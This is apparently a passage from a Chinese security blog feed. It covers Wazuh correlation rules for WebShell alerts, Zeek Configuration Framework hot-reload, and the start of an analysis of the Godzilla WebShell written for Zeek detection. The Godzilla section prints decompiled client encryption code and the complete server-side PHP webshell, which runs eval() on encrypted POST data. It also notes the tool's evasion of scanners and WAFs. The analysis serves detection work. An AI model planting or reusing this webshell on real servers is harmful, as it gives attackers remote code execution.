<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;suricata,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- /var/ossec/ruleset/rules/0475-suricata_rules.xml --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Defind Suricata Rules --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ID: 86600 - 86699 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;86600&quot;</span> <span class="attr">level</span>=<span class="string">&quot;0&quot;</span> <span class="attr">overwrite</span>=<span class="string">&quot;yes&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">decoded_as</span>&gt;</span>nta_json<span class="tag">&lt;/<span class="name">decoded_as</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;timestamp&quot;</span>&gt;</span>\.+<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;event_type&quot;</span>&gt;</span>\.+<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Suricata messages.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="0905-local-syscheck-xml"><a href="#0905-local-syscheck-xml" class="headerlink" title="0905-local_syscheck.xml"></a>0905-local_syscheck.xml</h6><p>为预处理脚本生成的日志进行解析</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;syscheck,&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;187100&quot;</span> <span class="attr">level</span>=<span class="string">&quot;7&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">decoded_as</span>&gt;</span>json<span class="tag">&lt;/<span class="name">decoded_as</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;integration&quot;</span>&gt;</span>custom-syscheck<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>syscheck integration messages.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="9999-local-composite-xml"><a href="#9999-local-composite-xml" class="headerlink" title="9999-local_composite.xml"></a>9999-local_composite.xml</h6></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;local,composite,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Local Composite Rules Range ID: 200000 - 205000 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;200000&quot;</span> <span class="attr">level</span>=<span class="string">&quot;15&quot;</span> <span class="attr">frequency</span>=<span class="string">&quot;2&quot;</span> <span class="attr">timeframe</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_matched_sid</span>&gt;</span>101000<span class="tag">&lt;/<span class="name">if_matched_sid</span>&gt;</span> <span class="comment">&lt;!-- 文件上传类规则 or 检测WebShell上传类规则 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_sid</span>&gt;</span>187100<span class="tag">&lt;/<span class="name">if_sid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">same_source_ip</span> /&gt;</span>	<span class="comment">&lt;!-- 通过IP进行关联 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Phase 3: 检测到服务器:$(srcip), 被上传WebShell.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;200001&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span> <span class="attr">frequency</span>=<span class="string">&quot;2&quot;</span> <span class="attr">timeframe</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_matched_sid</span>&gt;</span>88801<span class="tag">&lt;/<span class="name">if_matched_sid</span>&gt;</span> <span class="comment">&lt;!-- WAF安全事件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_group</span>&gt;</span>ids<span class="tag">&lt;/<span class="name">if_group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">same_source_ip</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Phase 3: Alarm - Same ip Bypass WAF of within 600 seconds. $(srcip) -&gt; $(http.hostname) -&gt; $(alert.signature) -&gt; $(alert.signature_id).<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li><p>对于<strong>WebShell</strong>关联检测,目前采用的是同源IP以及时序的关联, 最为靠谱的应该是通过Hash的比对。这里要吐槽一下Suricata默认的fileinfo, 没办法自定义输出, 只要开启可被还原的协议都会输出fileinfo的事件。正因如此, 数据量一大Wazuh的引擎压力会很大。我尝试通过<strong>Lua</strong>来自定义一个文件审计类的事件, 貌似也同样没办法区分协议更别说针对http过滤条件进行自定义的过滤输出了。</p>
</li>
<li><p>由于关联规则本身是通过底层多个安全事件进行维度的关联提升告警的<strong>可靠性</strong>。因此, 底层安全事件不够准确同样会让上层的关联规则带来大量误报。对于底层安全事件的优化也是需要持续进行的。</p>
</li>
<li><p>  <strong>Wazuh v3.11.4</strong> 采用syslog接收大日志时, 会触发<code>memory violation</code>导致<code>ossec-remoted</code>进程重启, 该问题已向社区反馈下个版本中会解决。</p>
</li>
</ol>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><p><strong><a href="https://wazuh.com/blog/how-to-forward-android-syslog-to-wazuh/">How to forward Android syslog to Wazuh</a></strong></p>
</li>
<li><p><strong><a href="https://wazuh.com/blog/how-to-configure-rsyslog-client-to-send-events-to-wazuh/">How to configure Rsyslog client to send events to Wazuh</a></strong></p>
</li>
<li><p><strong><a href="https://wazuh.com/blog/how-to-integrate-external-software-using-integrator/">How to integrate external software using Integrator</a></strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>HIDS、NIDS</category>
      </categories>
      <tags>
        <tag>Logstash</tag>
        <tag>Suricata</tag>
        <tag>Wazuh</tag>
        <tag>Filbeat</tag>
      </tags>
  </entry>
  <entry>
    <title>了不起的 Zeek Configuration Framework</title>
    <url>/2022/12/15/Zeek-Configuration-Framework/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>​    上半年是忙的要死，下半年都没怎么做“阳间”的事。这会“阳”了，顺带可以整理一些零散的知识点分享给大家。这一偏会比较剪短一些。</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​    知道Zeek的小伙伴应该都熟悉或者知道Suricata吧。Suricata在每次调整规则之后是可以通过reload来直接加载规则的，这样的好处是不用重启Suricata就让规则生效，生效速度很快。不知道大家在Zeek上是怎么做的，我之前都是用<code>zeek deploy</code>的方式确保最新的配置加载。起初，这并不会有什么太大的问题，但是随着Zeek的机器越来越多，操作就会变的异常繁琐。当然，如果你使用了Zeek的集群架构，它也是比较方便的。我今天就来介绍一个让配置加载变的更加便捷的方法，那就是利用Zeek自带的<a href="https://docs.zeek.org/en/master/frameworks/configuration.html#configuration-framework">Configuration Framework</a>来实现日常大部分的配置变更与“热”加载。</p>
<h4 id="那么开始吧？"><a href="#那么开始吧？" class="headerlink" title="那么开始吧？"></a>那么开始吧？</h4><h5 id="注意支持类型"><a href="#注意支持类型" class="headerlink" title="注意支持类型"></a>注意支持类型</h5><p>​    就像我上面的描述那样，Configuration Framework能做到对日常大部分的配置实现“热”加载。因为它有类型的要求，只有在脚本中包含指定的配置项类型才能实现试试下发与“热”加载。一旦出现类型错误，日志将会被发送至<code>reporter.log</code>文件中，大家注意观察。目前支持的类型在大多数情况下是够用的，下表为详细类型：</p>
<table>
<thead>
<tr>
<th>Data Type</th>
<th>Sample Config File Entry</th>
<th>Comments</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-addr"><code>addr</code></a></td>
<td><code>1.2.3.4</code></td>
<td>Plain IPv4 or IPv6 address, as in Zeek. No <code>/32</code> or similar netmasks.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-bool"><code>bool</code></a></td>
<td><code>T</code></td>
<td><code>T</code> or <code>1</code> for true, <code>F</code> or <code>0</code> for false</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-count"><code>count</code></a></td>
<td><code>42</code></td>
<td>Plain, nonnegative integer.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-double"><code>double</code></a></td>
<td><code>-42.5</code></td>
<td>Plain double number.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-enum"><code>enum</code></a></td>
<td><code>Enum::FOO_A</code></td>
<td>Plain enum string.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-int"><code>int</code></a></td>
<td><code>-1</code></td>
<td>Plain integer.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-interval"><code>interval</code></a></td>
<td><code>3600.0</code></td>
<td>Always in epoch seconds, with optional fraction of seconds. Never includes a time unit.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-pattern"><code>pattern</code></a></td>
<td>`/(foo</td>
<td>bar)/`</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-port"><code>port</code></a></td>
<td><code>42/tcp</code></td>
<td>Port number with protocol, as in Zeek. When the protocol part is missing, Zeek interprets it as <code>/unknown</code>.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-set"><code>set</code></a></td>
<td><code>80/tcp,53/udp</code></td>
<td>The set members, formatted as per their own type, separated by commas. For an empty set, use an empty string: just follow the option name with whitespace.Sets with multiple index types (e.g. <code>set[addr,string]</code>) are currently not supported in config files.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-string"><code>string</code></a></td>
<td><code>Don’t bite, Zeek</code></td>
<td>Plain string, no quotation marks. Given quotation marks become part of the string. Everything after the whitespace separator delineating the option name becomes the string. Saces and special characters are fine. Backslash characters (e.g. <code>\n</code>) have no special meaning.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-subnet"><code>subnet</code></a></td>
<td><code>1.2.3.4/16</code></td>
<td>Plain subnet, as in Zeek.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-time"><code>time</code></a></td>
<td><code>1608164505.5</code></td>
<td>Always in epoch seconds, with optional fraction of seconds. Never includes a time unit.</td>
</tr>
<tr>
<td><a href="https://docs.zeek.org/en/master/script-reference/types.html#type-vector"><code>vector</code></a></td>
<td><code>1,2,3,4</code></td>
<td>The set members, formatted as per their own type, separated by commas. For an empty vector, use an empty string: just follow the option name with whitespace.</td>
</tr>
</tbody></table>
<h5 id="示例：record-http-domain"><a href="#示例：record-http-domain" class="headerlink" title="示例：record-http_domain"></a>示例：record-http_domain</h5><p>​    针对需要对HTTP做审计或者监测的小伙伴，可以通过此方法快速的将不需要的记录的域名进行过滤，或者只记录关注的域名。</p>
<ul>
<li><p>record-http_domain.zeek</p>
<p>任何需要进行动态调整的参数，都必须在export中通过option去声明。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> HTTP;</span><br><span class="line"><span class="keyword">module</span> HTTPFilterDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  <span class="meta"># domain name</span></span><br><span class="line">  option local_domain: <span class="built_in">set</span>[<span class="built_in">string</span>] = &#123;&#125;;</span><br><span class="line">  # record_local_zone</span><br><span class="line">  option record_local_zone: <span class="keyword">bool</span> = F;</span><br><span class="line">  # Load HTTP config.dat</span><br><span class="line">  redef Config::config_files += &#123; <span class="string">&quot;/usr/local/zeek/share/zeek/site/http-audit/record-http_domain.dat&quot;</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">redef record HTTP::Info += &#123;</span><br><span class="line">  is_local_zone: <span class="keyword">bool</span> &amp;<span class="built_in">log</span> &amp;<span class="keyword">default</span>=F;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span> &amp;priority </span>= <span class="number">10</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( filter$name != <span class="string">&quot;default&quot;</span> )</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( record_local_zone )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> ( rec$host ! in local_domain )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    rec$is_local_zone = T;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> ( rec$host in local_domain )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>record-http_domain.dat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># string</span></span><br><span class="line">HTTPFilterDomain::local_domain ifconfig.io,ipinfo.io</span><br><span class="line"><span class="comment"># bool</span></span><br><span class="line">HTTPFilterDomain::record_local_zone F</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="看一下效果如何"><a href="#看一下效果如何" class="headerlink" title="看一下效果如何"></a>看一下效果如何</h4><p>​    由于我是将HTTP发送到了Kafka里面，好处就是不用关注本身NTA机器的磁盘存储的问题了。这里我通过Kafka的Topic数据给大家看下。</p>
<p><img src="/2022/12/15/Zeek-Configuration-Framework/iShot_2022-12-16_16.24.59.png" alt="iShot_2022-12-16_16.24.59"></p>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek - Detect Godzilla WebShell</title>
    <url>/2021/11/30/Zeek-Detect-Godzilla-WebShell/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>Godzilla（哥斯拉）：</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla.png" alt="image-20211211235918877"></p>
<p>​    身高：50米</p>
<p>​    体重：2万吨</p>
<p>​    攻击方式：放射热线、白热光、袋鼠踢、投掷、搏击、尾鞭</p>
<p>​    一种生活在侏罗纪和白垩纪之间的罕见海栖爬虫类和陆生兽类的中间形态生物的残存个体，因氢弹试验的影响而出现。最初在太平洋上出现并袭击货船，后经大户岛在东京登陆，造成巨大破坏。最终在东京湾被芹泽博士发明的水中氧气破坏素（核能氧气素/氧气破坏者）杀死。</p>
<p>​    以下文章将简述如何捕获该怪兽，首先派大量直升机去恶魔岛劫持另一体型巨大但温和许多的巨兽：金刚。然后让金刚抗伤害人类偷袭就好。<strong>本篇完！</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Kong.webp" alt="image-20211211235918877"></p>
<p><strong>实在编不下去了，来点正经的吧。。。</strong></p>
<hr>
<p><a href="https://github.com/BeichenDream/Godzilla"><strong>Godzilla</strong></a>（哥斯拉）是一款优秀的WebShell权限管理工具，其特点有：</p>
<ul>
<li><p>哥斯拉全部类型的Shell均过市面所有静态查杀</p>
</li>
<li><p>哥斯拉流量加密过市面全部流量WAF</p>
</li>
<li><p>哥斯拉的自带的插件是冰蝎、蚁剑不能比拟的</p>
</li>
</ul>
<p><strong><a href="https://github.com/zeek/zeek">Zeek</a></strong> （原名：Bro） 是一个开源的网络流量分析器。许多运营商将Zeek作为网络安全监控器（NSM），支持对可疑或恶意活动的调查。Zeek还支持安全领域以外的广泛的流量分析任务，包括性能测量和故障排除。其特点有：</p>
<ul>
<li><p>深度分析：Zeek带有许多协议的分析器，可以在应用层进行高级语义分析。</p>
</li>
<li><p>适应性和灵活性：Zeek的特定领域脚本语言可以实现特定地点的监控策略，这意味着它不受限于任何特定的检测方法。</p>
</li>
<li><p>高效：Zeek以高性能网络为目标，在各种大型网站上运行。</p>
</li>
<li><p>高度的状态性：Zeek对其监控的网络保持广泛的应用层状态，并提供网络活动的高级档案。</p>
</li>
</ul>
<p><strong>环境</strong></p>
<ul>
<li>Godzilla： v4.0.1</li>
<li>Zeek：v4.1.0</li>
<li>WebShell：<ul>
<li>PHP XOR BASE64</li>
<li>JSP AES BASE64</li>
</ul>
</li>
</ul>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul>
<li>基础配置：URL、密码、密钥、加密器等信息。如下图所示：<ul>
<li>密码：和蚁剑、菜刀一样，密码就是POST请求中的参数名称。例如，在本例中密码为<code>Happy</code>，那么Godzilla提交的每个请求都是<code>Happy=XXX</code>这种形式。以下称为<strong>pass</strong></li>
<li>密钥：用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的MD5值，然后取其前16位用于加密。以下为称为<strong>key</strong></li>
<li>有效载荷：生成对应类型的WebShell</li>
<li>加密器：控制WebShell的加密方式</li>
<li>请求配置：主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征</li>
</ul>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt="image-20211130173607606"></p>
<ul>
<li><p>由于Godzilla的源码作者并未做混淆，所以通过<a href="https://github.com/skylot/jadx"><strong>jadx</strong></a>工具很方便就能得到源码。</p>
<p>对于<strong>PHP XOR BASE64</strong>加密方式来说，首位各附加了<strong>16位</strong>的校验字符串（<strong>pass</strong> + <strong>key</strong> 计算的<strong>MD5</strong>值）。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXor</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));	<span class="comment">// 校验字符串</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>);												<span class="comment">// 前16位MD5</span></span><br><span class="line">        <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>);													<span class="comment">// 后16位MD5</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>请求加密<ul>
<li>对于明文数据使用<strong>key</strong>进行按位异或-&gt;base64编码-&gt;url编码，实现数据加密；</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> E(data);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          Log.error(e);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过key按位异或</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">      <span class="keyword">int</span> len = cs.length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">          cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>响应解密</p>
<ul>
<li><p>首先调用<code>findStr</code>方法删除响应数据中的前后16位校验字符串；</p>
</li>
<li><p>然后利用<code>base64Decode</code>方法解码字符串；</p>
</li>
<li><p>最后使用<strong>key</strong>按位异或，实现数据解密；</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="keyword">null</span> || data.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> D(findStr(data));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">    <span class="keyword">int</span> len = cs.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> functions.subMiddleStr(<span class="keyword">new</span> String(respResult), <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>演示数据 - 数据解密</strong></p>
<p>![image-20211201143236656](./Zeek-Detect-Godzilla-WebShell/示例数据 - 1.png)</p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>​    <strong>PHP XOR BASE64</strong> 类型的加密Shell的服务器端代码如下，其中定义了<code>encode</code>函数，用于加密或解密请求数据。由于是通过按位异或实现的加密，所以<code>encode</code>函数即可用于加密，同时也可用于解密。整个Shell的基本执行流程是：服务器接收到Godzilla发送的第一个请求后，由于此时尚未建立session，所以将POST请求数据解密后（得到的内容为Shell操作中所需要用到的相关<code>php</code>函数定义代码）存入session中，后续Godzilla只会提交相关操作对应的函数名称（如获取目录中的文件列表对应的函数为<code>getFile</code>）和相关参数，这样哥斯拉的相关操作就不需要发送大量的请求数据。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;Happy&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;bdf2e45b317c4585&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

